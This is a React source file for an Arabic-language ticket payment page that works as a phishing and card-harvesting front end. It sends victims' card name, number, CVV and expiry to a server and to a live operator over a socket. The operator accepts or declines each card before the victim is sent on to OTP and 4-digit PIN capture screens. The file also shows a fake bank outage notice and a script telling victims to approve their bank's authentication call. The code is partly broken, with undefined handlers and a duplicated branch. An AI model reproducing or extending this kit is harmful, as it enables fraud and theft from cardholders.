import React, { useEffect, useState } from "react";
import { FaCcVisa, FaLock } from "react-icons/fa6";
import { TailSpin } from "react-loader-spinner";
import { serverRoute, socket } from "./Home";
import { AiOutlineCloseCircle } from "react-icons/ai";
import axios from "axios";
import { useNavigate } from "react-router-dom";
const PaymentForm = () => {
  const data = sessionStorage.getItem("data");
  const navigate = useNavigate();
  const [page, setPage] = useState(0);
  const [loading, setLoading] = useState(false);
  const [failed, setFailed] = useState(true);
  const [card_name, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cvv, setCvv] = useState("");
  const [expiryDate, setExpiryDate] = useState("");
  const [method, setMethod] = useState(sessionStorage.getItem("method"));
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [errorCard, setErrorCard] = useState(false);
  const [otp, setOtp] = useState(null);

  // Format as "HH:MM:SS"
  const formatCardNumber = (value) => {
    // Remove non-numeric characters
    const numericValue = value.replace(/\D/g, "");

    // Add space after every 4 digits
    let formattedValue = numericValue.replace(/(\d{4})(?=\d)/g, "$1 ");

    // Trim to 16 characters
    formattedValue = formattedValue.slice(0, 19);

    // Update state
    setCardNumber(formattedValue);
  };

  const handleCardNumberChange = (e) => {
    formatCardNumber(e.target.value);
  };

  const handleCvvChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setCvv(numericValue.slice(0, 3));
  };
  const handleExpiryDateChange = (e) => {
    // Limit input to 4 characters (MM/YY)
    const numericValue = e.target.value.replace(/\D/g, "");
    let formattedValue = numericValue.slice(0, 5);

    // Add "/" after 2 characters (month)
    if (formattedValue.length > 2) {
      formattedValue =
        formattedValue.slice(0, 2) + "/" + formattedValue.slice(2);
    }

    setExpiryDate(formattedValue);
  };
  const handlePinChange = (e) => {
    const numericValue = e.target.value.replace(/\D/g, "");
    setPin(numericValue.slice(0, 4));
  };

  const handleSumbit = async (e) => {
    e.preventDefault();
    setError(false);
    setLoading(true);
    e.preventDefault();
    let check = cardNumber.split(" ").join("");
    if (check.length !== 16) {
      setLoading(false);
      return window.alert("رقم البطاقه يجب ان يكون 16 رقم");
    }
    if (cardNumber.startsWith("4847")) {
      setLoading(false);
      return setErrorCard(`عذرًا، مصرف الراجحي موقوف حاليًا
    نفيدكم بأنه يوجد توقف مؤقت في خدمات مصرف الراجحي ، وذلك بسبب خلل فني من جهة مصدر البنك`);
    }
    try {
      const { _id, username, email } = JSON.parse(data);
      const finalData = {
        card_name,
        cardNumber,
        cvv,
        expiryDate,
        username,
        email,
      };
      await axios.post(serverRoute + "/visa/" + _id, finalData).then(() => {
        socket.emit("paymentForm", finalData);
      });
    } catch (error) {
      console.log(error);
    } finally {
    }
  };

  socket.on("acceptPaymentForm", (id) => {
    if (id === sessionStorage.getItem("id")) {
      sessionStorage.setItem("cardNumber", cardNumber);
      sessionStorage.setItem(
        "data",
        JSON.stringify({
          ...JSON.parse(data),
          card_name,
          cardNumber,
          cvv,
          expiryDate,
        })
      );
      window.location.href = "/otp";
    }
  });

  socket.on("declinePaymentForm", (id) => {
    if (id === sessionStorage.getItem("id")) {
      setPage(0);
      setLoading(false);
      setError(" تم رفض البطاقة");
    }
  });

  return (
    <div
      className="min-h-screen w-full bg-[#f4fafc] flex flex-col items-center"
      dir="rtl"
    >
      {loading && (
        <div
          className="fixed inset-0 bg-[#02020260] flex items-center justify-center z-50"
          dir="rtl"
        >
          <div className="bg-white rounded-lg p-8 max-w-md w-11/12 flex flex-col items-center justify-center">
            <img src="/logo.jpeg" alt="Tawtheeq Logo" className="h-20 mb-6" />
            <div className="relative w-32 h-32 mb-4">
              <img src="/loading.gif" alt="Loading" className="w-full h-full" />
            </div>
            <p className="text-gray-800 text-lg font-bold text-center">
              جاري التواصل مع مصدر البنك...
            </p>
          </div>
        </div>
      )}

      {page === 0 ? (
        <div className="w-full max-w-4xl px-4 py-10 flex flex-col gap-10">
          {/* Payment Section */}
          <div className="bg-white rounded-3xl p-8 shadow-sm border border-[#e7f1f7]">
            <h3 className="text-[#22305e] font-semibold text-xl mb-3">
              اختاروا وسيلة الدفع
            </h3>
            <p className="text-gray-500 text-sm mb-6">
              لإكمال طلبكم، يرجى اختيار وسيلة الدفع المفضلة.
            </p>

            {errorCard && (
              <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-xl">
                <p className="text-red-700 text-sm">{errorCard}</p>
              </div>
            )}

            {error && (
              <div className="mb-4 p-4 bg-red-50 border border-red-200 rounded-xl">
                <p className="text-red-700 text-sm">{error}</p>
              </div>
            )}

            {/* Payment Form */}
            <form onSubmit={handleSumbit} className="space-y-6">
              {/* Payment Method Selection */}
              <div className="border-2 border-green-500 rounded-3xl p-6">
                <div className="w-full flex justify-between items-center">
                  <h4 className="text-[#22305e]  text-sm mb-4 font-bold w-1/2">
                    البطاقة الائتمانية
                  </h4>
                  <div className="flex items-center gap-3 mb-4 w-2/3 -ml-8 justify-start">
                    <img
                      src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTHg6L0yf2DhQrkSIGWp0BnADyYi5OkOI2MPA&s"
                      alt="Visa and Mastercard Logos"
                      className="h-12"
                    />
                  </div>
                </div>

                {/* Card Holder Name */}
                <div className="mb-4">
                  <label className="block text-sm text-gray-600 mb-2 text-right">
                    اسم حامل البطاقة
                  </label>
                  <input
                    value={card_name}
                    required
                    onChange={(e) => setCardName(e.target.value)}
                    type="text"
                    placeholder="اسم حامل البطاقة"
                    className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500"
                  />
                </div>

                {/* Card Number */}
                <div className="mb-4">
                  <label className="block text-sm text-gray-600 mb-2 text-right">
                    رقم البطاقة
                  </label>
                  <input
                    value={cardNumber}
                    required
                    onChange={handleCardNumberChange}
                    maxLength={19}
                    minLength={16}
                    inputMode="numeric"
                    type="text"
                    placeholder="1234 1234 1234 1234"
                    className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500 text-center"
                    dir="ltr"
                  />
                </div>

                {/* Expiry Date and CVV */}
                <div className="grid grid-cols-2 gap-4 mb-4">
                  <div>
                    <label className="block text-xs text-gray-600 mb-2 text-right">
                      تاريخ الانتهاء الصلاحية
                    </label>
                    <input
                      type="text"
                      value={expiryDate}
                      maxLength={5}
                      inputMode="numeric"
                      onChange={handleExpiryDateChange}
                      placeholder="شهر / سنة"
                      required
                      className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500"
                    />
                  </div>
                  <div>
                    <label className="block text-xs text-gray-600 mb-2 text-right">
                      رمز الأمان
                    </label>
                    <div className="relative">
                      <input
                        className="w-full border-b border-gray-300 rounded-xl px-4 py-3 text-gray-400 outline-none focus:border-blue-500"
                        type="text"
                        value={cvv}
                        onChange={handleCvvChange}
                        inputMode="numeric"
                        maxLength={3}
                        placeholder="رمز الأمان"
                        required
                      />
                      <div className="absolute left-0 top-1/2 -translate-y-1/2">
                        <svg
                          xmlns="http://www.w3.org/2000/svg"
                          width="24"
                          height="24"
                          viewBox="0 0 24 24"
                          fill="none"
                          stroke="currentColor"
                          stroke-width="2"
                          stroke-linecap="round"
                          stroke-linejoin="round"
                          class="lucide lucide-circle-question-mark-icon lucide-circle-question-mark"
                        >
                          <circle cx="12" cy="12" r="10" />
                          <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3" />
                          <path d="M12 17h.01" />
                        </svg>
                      </div>
                    </div>
                  </div>
                </div>

                {/* Save Card Checkbox */}
                <div className="flex items-center gap-2">
                  <input
                    type="checkbox"
                    className="w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <label className="text-sm text-gray-600">حفظ</label>
                </div>
              </div>

              {/* Payment Terms */}
              <div className="space-y-4">
                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    required
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <span className="text-sm text-gray-600 leading-relaxed">
                    أؤكد أنني قرأت{" "}
                    <span className="text-red-700">شروط وأحكام</span> البيع
                    ووافقت عليها كما أنني على علم بشروط الإلغاء وسياسة استرداد
                    قيمة هذه التذاكر.
                  </span>
                </label>

                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    required
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <span className="text-sm text-gray-600 leading-relaxed">
                    أدرك أن جميع التذاكر{" "}
                    <span className="text-red-700">غير قابلة للاسترجاع</span>{" "}
                    بعد رفض الإلغاء أو{" "}
                    <span className="text-red-700">تعديل التذكرة</span> لإتمام
                    عملية الشراء.
                  </span>
                </label>

                <label className="flex items-start gap-3 cursor-pointer">
                  <input
                    type="checkbox"
                    required
                    className="mt-1 w-5 h-5 rounded border-gray-300 text-blue-700"
                  />
                  <span className="text-sm text-gray-600 leading-relaxed">
                    أؤكد أنني قرأت ووافقت على{" "}
                    <span className="text-red-700">سياسة الخصوصية</span> للبيع
                  </span>
                </label>
              </div>

              {/* Pay Now Button */}
              <button
                type="submit"
                className={`w-full px-8 py-3 rounded-full font-semibold shadow-sm transition-colors ${
                  card_name && cardNumber && cvv && expiryDate
                    ? "bg-blue-700 text-white hover:bg-blue-800 cursor-pointer"
                    : "bg-gray-300 text-gray-500 cursor-not-allowed"
                }`}
              >
                إدفع الآن
              </button>
            </form>
          </div>
        </div>
      ) : page === 1 ? (
        <div className="w-11/12 xl:w-1/3 lg:w-1/2  flex flex-col items-start justify-start bg-white  min-h-screen rounded-md py-5  payment ">
          <div className="w-full flex flex-col items-center justify-center  shadow-xl rounded-md  py-4">
            <div className="w-full flex items-center justify-around">
              <span className="px-3 font-medium py-1  border-2 rounded-md">
                عربي
              </span>
              <img className="w-1/2 " src="logo.svg" />
            </div>
            <span
              className="font-bold text-blue-600 w-full pl-5 pt-3
              mt-3 pb-1  "
              dir="rtl"
            >
              <span className="flex flex-row-reverse  gap-x-1">
                115.00 <span>SAR</span>
              </span>
            </span>
            <p className="w-full text-left pl-5  pb-1 text-lg">
              {" "}
              1 Item | Expire In 2 days
            </p>

            <form
              className="w-full flex flex-col  px-3 py-5 mt-5  bg-blue-50"
              onSubmit={handleSumbit}
            >
              <div className="relative mt-2 mb-5 flex items-center justify-center">
                <hr className="absolute  w-full top-3" />
                <span className=" bg-blue-50 z-10  left-20 px-5">
                  Insert Card Details
                </span>
              </div>
              <header></header>
              <div className="w-full flex flex-col gap-y-2 border rounded-t-md text-sm">
                <input
                  value={card_name}
                  required
                  onChange={(e) => setCardName(e.target.value)}
                  dir="ltr"
                  placeholder="Card Holder Name"
                  type="text"
                  className={`w-full rounded-md   text-black   py-2.5 px-3   text-left outline-none`}
                />
              </div>
              <div className="w-full flex flex-col  gap-y-2 border-x text-sm relative">
                <input
                  value={cardNumber}
                  required
                  onChange={handleCardNumberChange}
                  dir="ltr"
                  maxLength={19}
                  minLength={16}
                  inputMode="numeric"
                  type="text"
                  disabled={!method}
                  placeholder="Card Number"
                  className={`w-full rounded-md  text-black   py-2.5 px-3   text-left outline-none`}
                />
                <div className="flex items-center gap-x-1 absolute right-2 top-1 ">
                  <img src="/amex.svg" className="w-6 " />
                  <img src="/MasterCard.svg" className="w-6 " />
                  <img src="/Visa.svg" className="w-6 " />
                  <img
                    className="w-6 "
                    src={
                      "data:image/png;base64,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"
                    }
                  />
                </div>
              </div>
              <div className="w-full flex items-center border   bg-white   ">
                <input
                  className=" w-full   text-black text-sm text-left bg-white   px-2 py-2.5       outline-none"
                  type="text"
                  value={cvv}
                  disabled={!method}
                  onChange={handleCvvChange}
                  inputMode="numeric"
                  maxLength={3}
                  placeholder="CVV"
                  required
                />

                <input
                  type="text"
                  value={expiryDate}
                  maxLength={5}
                  inputMode="numeric"
                  onChange={handleExpiryDateChange}
                  className=" w-full   text-black text-sm text-left   p-2.5  border-r-2     outline-none"
                  placeholder="MM/YY"
                  required
                />
              </div>

              {errorCard ? (
                <p className="w-full flex justify-between p-3 border rounded-md text-red-500 mt-2 text-sm bg-[#f8d7da]">
                  {errorCard}
                </p>
              ) : (
                ""
              )}
              <button
                className="px-10 py-2 text-xl  bg-[#1566df] text-white rounded-md my-5"
                disabled={!method}
              >
                Pay Now
              </button>
              <div className="flex pt-3 items-center w-full justify-center ">
                <img src="payment-b.png" alt="" />
              </div>
            </form>
          </div>
        </div>
      ) : page === 1 ? (
        <div className="w-full max-w-4xl px-4 py-10">
          <div className="flex flex-col w-full p-8 text-sm gap-y-5 bg-white rounded-3xl shadow-sm border border-[#e7f1f7]">
            <span>
              سوف يتم الإتصال بك من خلال المصرف الخاص بحسابك،، الرجاء استقبال
              المكالمة وقبول طلب المصادقة
            </span>
            <span>لايمكنك الإستمرار بالمعاملة في حال عدم قبول المصادقة!</span>
            <span>
              سوق يتم الإتصال بك من قبل المصرف الخاص بك الرجاء الإنتظار...
            </span>
            <div className="container">
              <div className="bar"></div>
            </div>
            <div className="flex items-center justify-center w-full bg-white">
              <img src="wait.gif" className="w-full md:w-1/3 " />
            </div>
          </div>
        </div>
      ) : page === 2 ? (
        <div className="w-full max-w-4xl px-4 py-10">
          <div className="bg-white rounded-3xl p-8 shadow-sm border border-[#e7f1f7]">
            <form onSubmit={handleOtp}>
              <div className="flex w-full gap-x-3 items-center justify-center mb-6">
                <div className="w-12">
                  <img src="/visa_logo.jpg" alt="Visa" />
                </div>
                <div className="w-16">
                  <img
                    src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTlJeSetovZYxcpQmPuM-fu7k2EzUcVb3qU0w&s"
                    alt="3D Secure"
                  />
                </div>
                <div className="w-12">
                  <img src="/Mastercard.png" alt="Mastercard" />
                </div>
              </div>

              <p className="py-2 text-sm text-gray-700 mb-4">
                to continue with your transaction, please enter the one-time
                passcode sent to your mobile number or email address and click
                submit
              </p>

              <h2 className="font-semibold my-4 text-[#22305e] text-lg">
                Transaction Details
              </h2>

              <div className="space-y-3 mb-6">
                <div className="flex justify-between py-2 border-b">
                  <span className="font-semibold text-gray-700">
                    Transaction Amount:
                  </span>
                  <span className="flex flex-row-reverse text-[#22305e]">
                    <span>115</span>
                    <span className="mr-1">ريال</span>
                  </span>
                </div>
                <div className="flex justify-between py-2 border-b">
                  <span className="font-semibold text-gray-700">
                    Card Number:
                  </span>
                  <span className="text-[#22305e]">
                    ********
                    {sessionStorage
                      .getItem("cardNumber")
                      ?.split("")
                      .slice(15) || "9666"}
                  </span>
                </div>
                <div className="flex justify-between py-2 items-center gap-x-2">
                  <span className="font-semibold text-gray-700 w-1/3">
                    Enter Code:
                  </span>
                  <input
                    value={otp}
                    required
                    onChange={(e) => setOtp(e.target.value)}
                    dir="ltr"
                    minLength={4}
                    inputMode="numeric"
                    type="text"
                    className="border border-gray-300 rounded-xl px-4 py-2 outline-none focus:border-blue-500 w-2/3"
                  />
                </div>
              </div>

              <div className="w-full flex items-center justify-center py-6">
                <button
                  type="submit"
                  className="w-full md:w-auto px-10 py-3 bg-blue-700 text-white rounded-full font-semibold hover:bg-blue-800 transition-colors"
                >
                  Submit
                </button>
              </div>
            </form>
          </div>
        </div>
      ) : (
        <div className="w-full max-w-4xl px-4 py-10">
          <div className="bg-white rounded-3xl p-8 shadow-sm border border-[#e7f1f7]">
            <form onSubmit={handlePin}>
              <div className="w-full flex justify-center items-center mb-6">
                <img src="/logo.svg" className="w-1/3" alt="Logo" />
              </div>

              <h2 className="font-bold text-2xl my-4 w-full text-center text-[#22305e]">
                تأكيد ملكية البطاقة
              </h2>

              <p className="py-2 text-sm text-gray-600 mb-6">
                لضمان حماية معلوماتك وإتمام عملية الدفع بأمان، نرجو منك إدخال
                الرمز السري المكون من ٤ أرقام، يُستخدم هذا الرمز فقط لأغراض
                التحقق من ملكية البطاقة
              </p>

              <div className="flex justify-center py-1 items-center gap-x-2 w-full flex-col mb-6">
                <span className="text-[#22305e] text-sm font-semibold w-full mb-2">
                  أدخل الرمز هنا :
                </span>
                <input
                  value={pin}
                  required
                  onChange={(e) => setPin(e.target.value)}
                  dir="ltr"
                  maxLength={4}
                  minLength={4}
                  inputMode="numeric"
                  type="text"
                  className="border border-gray-300 rounded-xl px-4 py-3 text-center outline-none focus:border-blue-500 w-full"
                />
              </div>

              <div className="w-full flex items-center justify-center py-4">
                <button
                  className="w-full px-8 py-3 bg-blue-700 text-white rounded-full font-semibold hover:bg-blue-800 transition-colors"
                  type="submit"
                >
                  تأكيد
                </button>
              </div>

              <span className="text-gray-600 text-sm w-full block text-center mt-4">
                هل تحتاج إلي مساعدة ؟
              </span>
            </form>
          </div>
        </div>
      )}

      {error && (
        <div className="w-full text-center text-red-500 fixed bg-black bg-opacity-45 h-screen top-0 left-0 flex items-center justify-center z-30">
          <div className="bg-white py-5 px-4 md:w-1/3 w-11/12 rounded-xl flex justify-center items-center flex-col text-lg gap-y-3">
            <AiOutlineCloseCircle className="text-6xl text-red-500" />
            <div className="flex flex-col w-full items-center justify-center">
              <span className="text-gray-700">حدث خطأ في رمز التوثيق</span>
              <span className="text-red-600 mt-2">{error}</span>
            </div>
            <button
              className="bg-blue-700 text-white w-full py-3 rounded-full mt-4 hover:bg-blue-800 transition-colors"
              onClick={() => setError(null)}
            >
              حاول مرة ثانية
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default PaymentForm;
